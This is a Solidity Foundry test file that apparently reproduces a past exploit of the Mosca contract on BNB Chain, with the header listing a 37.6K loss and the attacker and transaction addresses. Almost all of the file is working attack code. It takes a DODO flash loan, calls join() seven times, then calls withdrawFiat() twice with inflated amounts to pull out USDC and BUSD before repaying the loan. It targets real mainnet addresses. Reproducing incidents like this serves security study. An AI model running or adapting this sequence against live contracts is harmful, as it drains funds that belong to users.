// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 37.6K
// Attacker : https://bscscan.com/address/0xe763da20e25103da8e6afa84b6297f87de557419
// Attack Contract : https://bscscan.com/address/0xedcfa34e275120e7d18edbbb0a6171d8ad3ccf54
// Created Attack Contract: https://bscscan.com/address/0xeDcfA34E275120E7D18EDbbb0A6171d8ad3CCF54
// Vulnerable Contract : https://bscscan.com/address/0xd8791f0c10b831b605c5d48959eb763b266940b9
// Attack Tx : https://bscscan.com/tx/0xf13d281d4aa95f1aca457bd17f2531581b0ce918c90905d65934c9e67f6ae0ec

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xd8791f0c10b831b605c5d48959eb763b266940b9#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

import "../interface.sol";

interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function _BASE_TOKEN_() external view returns (address);
}

interface IMosca {
    function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external;
    function withdrawFiat(uint256 amount, bool isFiat, uint8 fiatToWithdraw) external;
}

contract Mosca2 is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 45_722_243;
    address internal constant DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address internal constant Mosca = 0xd8791F0C10B831B605C5D48959EB763B266940B9;
    address internal constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(USDC);
    }

    function testExploit() public balanceLog {
        uint256 baseAmount = 0;
        uint256 quoteAmonut = 7_000_000_000_000_000_000_000;
        address assetTo = address(this);
        bytes memory data = abi.encode("0xdead");
        IDODO(DPP).flashLoan(baseAmount, quoteAmonut, assetTo, data);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        IERC20(BUSD).approve(Mosca, type(uint).max);
        IERC20(USDC).approve(Mosca, type(uint).max);
        for(uint256 i=0;i<7;i++) {
            uint256 amount = 1_000_000_000_000_000_000_000;
            uint256 _refCode = 0;
            uint8 fiat = 1;
            bool enterpriseJoin = false;
            IMosca(Mosca).join(amount, _refCode, fiat, enterpriseJoin);
        }

        IMosca(Mosca).withdrawFiat(18_671_180_855_284_200_248_407, false, 1);
        IMosca(Mosca).withdrawFiat(26_648_013_000_000_000_000_000, false, 0);

        IERC20(BUSD).transfer(DPP, quoteAmount);
    }
}
